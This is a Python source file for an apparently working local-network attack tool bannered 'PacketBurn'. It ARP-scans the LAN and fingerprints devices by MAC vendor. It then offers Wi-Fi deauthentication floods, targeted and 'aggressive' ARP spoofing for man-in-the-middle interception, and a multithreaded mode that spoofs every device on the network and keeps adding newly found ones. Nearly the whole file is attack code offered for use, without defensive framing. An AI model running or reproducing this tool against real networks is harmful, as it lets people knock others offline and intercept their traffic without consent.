from termcolor import colored
import os
import time
import scapy.all as scapy
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.l2 import ARP, Ether
import netifaces
import socket
import subprocess
import threading
from queue import Queue

ascii_art = '''
 ██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄▄▄█████▓  ▄▄▄▄    █    ██  ██▀███   ███▄    █ 
▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀▓  ██▒ ▓▒▓ █████▄  ██  ▓██▒▓██ ▒ ██▒ ██ ▀█   █ 
▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███  ▒ ▓██░ ▒░▒ ██▒ ▄██▓██  ▒██░▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄░ ▓██▓ ░ ▒ ██░█▀  ▓▓█  ░██░▒██▀▀█▄  ▓██▒  ▐▌██▒
▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒ ▒██▒ ░ ░ ▓█  ▀█▓▒▒█████▓ ░██▓ ▒██▒▒██░   ▓██░
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░   ░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░   ░    ▒░▒   ░ ░░▒░ ░ ░   ░▒ ░ ▒░░ ░░   ░ ▒░
░░         ░   ▒   ░        ░ ░░ ░    ░    ░       ░    ░  ░░░ ░ ░   ░░   ░    ░   ░ ░ 
               ░  ░░ ░      ░  ░      ░  ░         ░         ░        ░              ░ 
                   ░                                    ░          

                                [+] By: GIT @sous4sec
'''

# Color the ASCII art
colored_ascii = colored(ascii_art, 'red')
print(colored_ascii)

class DeviceIdentifier:
    """Class to identify device types based on MAC address and network behavior"""
    
    # Vendor OUI database (partial list)
    VENDOR_OUI = {
        '00:1A:11': 'Cisco', '00:0C:29': 'VMware', '00:1C:B3': 'Dell',
        '00:24:8C': 'Samsung', '00:26:BB': 'Apple', '00:1D:0F': 'Sony',
        '00:23:12': 'Intel', '00:1F:16': 'Nokia', '00:1E:65': 'LG',
        '00:1F:5B': 'Roku', '00:1A:79': 'Netgear', '00:1B:63': 'TP-Link',
        '00:1C:F0': 'Google', '00:1D:72': 'Microsoft', '00:1E:37': 'Philips',
        '00:1F:33': 'HTC', '00:21:6A': 'Motorola', '00:22:5F': 'ASUS',
        '00:23:7D': 'Huawei', '00:24:01': 'ZTE', '00:25:9C': 'Amazon',
        '00:26:5E': 'Sony Ericsson', '00:27:09': 'RIM (BlackBerry)',
        '00:50:F2': 'Microsoft (Virtual)', '00:1A:2B': 'HP', '00:1B:2F': 'Acer',
        '00:1C:42': 'Lenovo', '00:1D:09': 'Toshiba', '00:1E:68': 'Sharp',
        '00:1F:3A': 'Panasonic', '00:21:47': 'Vizio', '00:22:6B': 'Belkin',
        '00:23:15': 'D-Link', '00:24:D6': 'Sagemcom', '00:26:4A': 'Technicolor',
        '00:50:C2': 'Seagate', '00:0D:4B': 'Roku', '00:18:82': 'Xerox',
        '00:19:99': 'Brother', '00:1E:8C': 'Epson', '00:21:86': 'Canon',
        '00:22:3F': 'Epson', '00:23:EB': 'Epson', '00:24:A5': 'Epson',
        '00:26:AB': 'Epson'
    }
    
    @staticmethod
    def get_vendor(mac):
        """Get vendor name from MAC address"""
        oui = mac[:8].upper()
        for prefix in DeviceIdentifier.VENDOR_OUI:
            if oui.startswith(prefix):
                return DeviceIdentifier.VENDOR_OUI[prefix]
        return "Unknown"
    
    @staticmethod
    def guess_device_type(mac, ip, vendor):
        """Guess device type based on MAC vendor and IP"""
        mac_prefix = mac[:8].upper()
        
        # Common mobile device prefixes
        mobile_prefixes = ['00:26:BB', '00:1F:16', '00:23:12', '00:1E:65']
        if any(mac_prefix.startswith(p) for p in mobile_prefixes):
            return "Mobile Phone"
            
        # Common IoT/embedded prefixes
        iot_prefixes = ['00:1F:5B', '00:1A:79', '00:1B:63']
        if any(mac_prefix.startswith(p) for p in iot_prefixes):
            return "IoT Device"
            
        # Common networking equipment
        network_prefixes = ['00:1A:11', '00:0C:29', '00:1C:B3']
        if any(mac_prefix.startswith(p) for p in network_prefixes):
            return "Networking Equipment"
            
        # Try to identify by hostname
        try:
            hostname = socket.gethostbyaddr(ip)[0].lower()
            if 'android' in hostname:
                return "Android Device"
            elif 'iphone' in hostname or 'ipad' in hostname:
                return "Apple Mobile Device"
            elif 'tv' in hostname:
                return "Smart TV"
            elif 'pc' in hostname or 'desktop' in hostname or 'laptop' in hostname:
                return "Computer"
            elif 'router' in hostname or 'modem' in hostname:
                return "Router/Modem"
            elif 'printer' in hostname:
                return "Printer"
        except:
            pass
            
        # Fallback to vendor-based guessing
        vendor_lower = vendor.lower()
        if 'apple' in vendor_lower:
            return "Apple Device"
        elif 'samsung' in vendor_lower:
            return "Samsung Device"
        elif 'dell' in vendor_lower or 'hp' in vendor_lower or 'lenovo' in vendor_lower:
            return "Computer"
        elif 'sony' in vendor_lower:
            return "Sony Device"
        elif 'lg' in vendor_lower:
            return "LG Device"
        elif 'roku' in vendor_lower:
            return "Streaming Device"
        elif 'tv' in vendor_lower:
            return "Smart TV"
            
        return "Unknown Device"

class NetworkScanner:
    """Class to detect devices on the local network"""
    
    def __init__(self):
        self.interface = self.get_network_interface()
        self.gateway_ip = self.get_gateway()
        self.local_ip = netifaces.ifaddresses(self.interface).get(netifaces.AF_INET, [{}])[0].get('addr')
        self.local_mac = netifaces.ifaddresses(self.interface).get(netifaces.AF_LINK, [{}])[0].get('addr')
        self.connection_type = self.detect_connection_type()

    def detect_connection_type(self):
        """Detect if the connection is wired (LAN) or wireless (Wi-Fi)"""
        try:
            # Linux/MacOS
            if os.name == 'posix':
                if 'wlan' in self.interface or 'wlp' in self.interface:
                    return "Wi-Fi"
                else:
                    return "LAN"
            # Windows
            else:
                output = subprocess.check_output(["netsh", "interface", "show", "interface"]).decode()
                if "Wireless" in output:
                    return "Wi-Fi"
                else:
                    return "LAN"
        except:
            return "Unknown"

    def get_network_interface(self):
        """Detect the connected network interface"""
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            if iface == 'lo':
                continue
            if netifaces.AF_INET in netifaces.ifaddresses(iface):
                return iface
        return None

    def get_gateway(self):
        """Get the default gateway"""
        gateways = netifaces.gateways()
        return gateways['default'][netifaces.AF_INET][0] if 'default' in gateways else None

    def scan_network(self):
        """Discover devices connected to the network"""
        print(colored(f"[+] Scanning network {self.gateway_ip}/24 on interface {self.interface} ({self.connection_type})...", 'yellow'))
        arp_request = scapy.ARP(pdst=f"{self.gateway_ip}/24")
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = broadcast / arp_request
        answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]

        devices = []
        for sent, received in answered:
            vendor = DeviceIdentifier.get_vendor(received.hwsrc)
            device_type = DeviceIdentifier.guess_device_type(received.hwsrc, received.psrc, vendor)
            
            devices.append({
                "ip": received.psrc,
                "mac": received.hwsrc,
                "vendor": vendor,
                "type": device_type,
                "connection": self.connection_type
            })
        
        return devices

class DeauthAttack:
    """Class to perform deauthentication attacks"""
    
    def __init__(self, interface):
        self.interface = interface

    def send_deauth(self, target_mac, bssid, count=100):
        """Send deauthentication packets"""
        pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        print(colored(f"[+] Sending {count} deauth packets to {target_mac} on network {bssid}...", 'red'))
        scapy.sendp(pkt, iface=self.interface, count=count, inter=0.1)

class ARPSpoofing:
    """Class to perform ARP spoofing attacks"""
    
    def __init__(self, gateway_ip):
        self.gateway_ip = gateway_ip
        self.running = False
        self.threads = []
        self.device_queue = Queue()
        self.lock = threading.Lock()

    def get_mac(self, ip):
        """Get MAC address from IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
        response = scapy.srp(broadcast, timeout=0.1, verbose=False)[0]
        return response[0][1].hwsrc if response else None

    def spoof(self, target_ip):
        """Perform ARP spoofing attack"""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            with self.lock:
                print(colored(f"[-] MAC Address for {target_ip} not found!", 'yellow'))
            return
        
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        scapy.send(packet, verbose=False)
        with self.lock:
            print(colored(f"[+] Sending ARP spoofing packets to {target_ip}...", 'red'))

    def spoof_worker(self):
        """Worker thread for continuous spoofing"""
        while self.running:
            try:
                target_ip = self.device_queue.get_nowait()
                for _ in range(100):  # Send 100 packets per target per iteration
                    self.spoof(target_ip)
                    self.spoof(self.gateway_ip)
                self.device_queue.task_done()
            except:
                time.sleep(0.01)

    def mass_spoof(self, target_ips):
        """Massive ARP spoofing attack with multiple threads"""
        self.running = True
        num_threads = 10  # Number of parallel threads
        
        # Start worker threads
        for i in range(num_threads):
            t = threading.Thread(target=self.spoof_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Continuously feed targets to the queue
        try:
            while self.running:
                # Add all targets to the queue
                for ip in target_ips:
                    self.device_queue.put(ip)
                time.sleep(0.1)  # Small delay to prevent CPU overload
        except KeyboardInterrupt:
            self.stop_attack()
            for ip in target_ips:
                self.restore_network(ip)

    def stop_attack(self):
        """Stop all spoofing threads"""
        self.running = False
        for t in self.threads:
            t.join()
        print(colored("[+] All attack threads stopped.", 'green'))

    def restore_network(self, target_ip):
        """Restore victim's ARP table"""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
        scapy.send(packet, verbose=False, count=5)
        print(colored(f"[+] Restoring network for {target_ip}...", 'green'))

    def arpspoof_killer(self, target_ip, duration=30):
        """Fast and aggressive ARP spoofing attack"""
        print(colored(f"[+] Starting aggressive ARP Spoofing attack on {target_ip}...", 'yellow'))

        start_time = time.time()
        while duration is None or time.time() - start_time < duration:
            self.spoof(target_ip)  
            self.spoof(self.gateway_ip)  
            time.sleep(0.001)  
        print(colored("[+] Aggressive ARP attack finished.", 'green'))

def display_devices(devices, local_ip):
    """Display list of connected devices"""
    if not devices:
        print(colored("[-] No devices found.", 'yellow'))
    else:
        print(colored("\nDiscovered devices:", 'green'))
        print(colored("{:<5} {:<15} {:<18} {:<25} {:<25} {:<10}".format(
            "ID", "IP", "MAC", "Vendor", "Device Type", "Connection"), 'cyan'))
        print("-" * 100)
        
        for i, dev in enumerate(devices):
            if dev['ip'] == local_ip:
                device_color = 'green'
            else:
                device_color = 'white'
                
            print(colored("{:<5} {:<15} {:<18} {:<25} {:<25} {:<10}".format(
                i, dev['ip'], dev['mac'], dev['vendor'], dev['type'], dev['connection']), device_color))

def continuous_scan(scanner, devices_to_attack, lock):
    """Background thread for continuous scanning"""
    while True:
        time.sleep(5)  # Scan every 5 seconds
        new_devices = scanner.scan_network()
        with lock:
            for dev in new_devices:
                if dev['ip'] not in devices_to_attack and dev['ip'] != scanner.local_ip and dev['mac'] != scanner.local_mac:
                    devices_to_attack.append(dev['ip'])
                    print(colored(f"[+] New device found: {dev['ip']} - Added to attack!", 'yellow'))

if __name__ == "__main__":
    scanner = NetworkScanner()
    print(colored(f"[*] Interface: {scanner.interface} ({scanner.connection_type})", 'cyan'))
    print(colored(f"[*] Gateway IP: {scanner.gateway_ip}", 'cyan'))
    print(colored(f"[*] Your IP: {scanner.local_ip}", 'cyan'))
    print(colored(f"[*] Your MAC: {scanner.local_mac}\n", 'cyan'))

    devices = scanner.scan_network()
    display_devices(devices, scanner.local_ip)

    while True:
        print(colored("\n1 - Update device list", 'cyan'))
        print(colored("2 - Choose device to attack", 'cyan'))
        print(colored("3 - Attack ALL devices (except yours) [AGGRESSIVE MODE]", 'cyan'))
        print(colored("4 - Exit", 'cyan'))
        choice = input(colored("\nChoose an option: ", 'yellow'))

        try:
            choice = int(choice)
        except ValueError:
            print(colored("[-] Please enter a valid number.", 'red'))
            continue

        if choice == 1:
            devices = scanner.scan_network()
            display_devices(devices, scanner.local_ip)

        elif choice == 2:
            if not devices:
                print(colored("[-] No devices to attack. Update the list first.", 'yellow'))
                continue

            try:
                target_choice = int(input(colored("\nChoose a device to attack: ", 'yellow')))
                if target_choice < 0 or target_choice >= len(devices):
                    raise ValueError
            except ValueError:
                print(colored("[-] Invalid choice.", 'red'))
                continue

            target_ip = devices[target_choice]['ip']
            target_mac = devices[target_choice]['mac']
            target_type = devices[target_choice]['type']
            connection_type = devices[target_choice]['connection']

            print(colored(f"\n[+] Selected device: {target_ip} ({target_mac})", 'yellow'))
            print(colored(f"[+] Type: {target_type}", 'yellow'))
            print(colored(f"[+] Connection: {connection_type}", 'yellow'))

            print(colored("\n1 - Deauth attack (Wi-Fi)", 'cyan'))
            print(colored("2 - ARP Spoofing (MITM)", 'cyan'))
            print(colored("3 - Aggressive ARP Spoofing (Fast Attack)", 'cyan'))
            attack_type = input(colored("\nChoose attack type: ", 'yellow'))

            try:
                attack_type = int(attack_type)
            except ValueError:
                print(colored("[-] Please enter a valid number.", 'red'))
                continue

            if attack_type == 1:
                if connection_type != "Wi-Fi":
                    print(colored("[-] Device is not connected via Wi-Fi. Deauth attack won't work.", 'red'))
                    continue
                    
                interface = scanner.interface
                if "mon" not in interface:
                    print(colored("[-] Interface needs to be in monitor mode! Use 'airmon-ng start wlan0'.", 'yellow'))
                    continue
                
                bssid = input(colored("Enter target router BSSID: ", 'yellow'))
                deauth = DeauthAttack(interface)
                deauth.send_deauth(target_mac, bssid)

            elif attack_type == 2:
                arp = ARPSpoofing(scanner.gateway_ip)
                try:
                    while True:
                        arp.spoof(target_ip)
                        arp.spoof(scanner.gateway_ip)
                        time.sleep(0.001)
                except KeyboardInterrupt:
                    print(colored("\n[+] Stopping attack and restoring network...", 'green'))
                    arp.restore_network(target_ip)
            
            elif attack_type == 3:
                arp = ARPSpoofing(scanner.gateway_ip)
                arp.arpspoof_killer(target_ip, duration=None)

        elif choice == 3:
            print(colored("[+] Starting MASSIVE attack on ALL devices (except yours)...", 'red'))
            print(colored("[+] Using 10 threads to send ~1000 packets/second per device!", 'red'))
            
            devices_to_attack = [dev['ip'] for dev in devices if dev['ip'] != scanner.local_ip and dev['mac'] != scanner.local_mac]
            
            if not devices_to_attack:
                print(colored("[-] No devices available to attack.", 'yellow'))
                continue
                
            # Start continuous scanning in background
            scan_lock = threading.Lock()
            scan_thread = threading.Thread(target=continuous_scan, args=(scanner, devices_to_attack, scan_lock))
            scan_thread.daemon = True
            scan_thread.start()
            
            # Start massive attack
            arp = ARPSpoofing(scanner.gateway_ip)
            try:
                arp.mass_spoof(devices_to_attack)
            except KeyboardInterrupt:
                print(colored("\n[+] Stopping attack and restoring network...", 'green'))
                arp.stop_attack()
                for ip in devices_to_attack:
                    arp.restore_network(ip)

        elif choice == 4:
            print(colored("[+] Exiting...", 'green'))
            break

        else:
            print(colored("[-] Invalid option. Try again.", 'red'))
